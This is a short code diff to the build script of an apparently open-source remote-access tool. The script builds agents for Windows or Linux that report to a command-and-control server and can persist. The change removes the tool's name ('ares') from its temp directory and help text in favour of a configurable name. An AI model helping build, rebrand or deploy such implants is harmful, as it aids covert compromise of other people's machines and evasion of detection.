@@ -1,7 +1,7 @@
 import os
 import shutil
 import tempfile
-
+import config
 
 def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
     prog_name = os.path.basename(output)
@@ -12,7 +12,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     if os.name != 'posix' and platform == 'linux':
         print("[!] Can only build Linux agents on Linux.")
         exit(0)
-    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
+    working_dir = os.path.join(tempfile.gettempdir(), config.AGENT_NAME)
     if os.path.exists(working_dir):
         shutil.rmtree(working_dir)
     agent_dir = os.path.dirname(__file__)
@@ -48,7 +48,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
 
 def main():
     from argparse import ArgumentParser
-    parser = ArgumentParser(description="Builds an Ares agent.")
+    parser = ArgumentParser(description="Builds an agent.")
     parser.add_argument('-p', '--platform', required=True, help="Target platform (Windows, Linux).")
     parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
     parser.add_argument('-o', '--output', required=True, help="Output file name.")
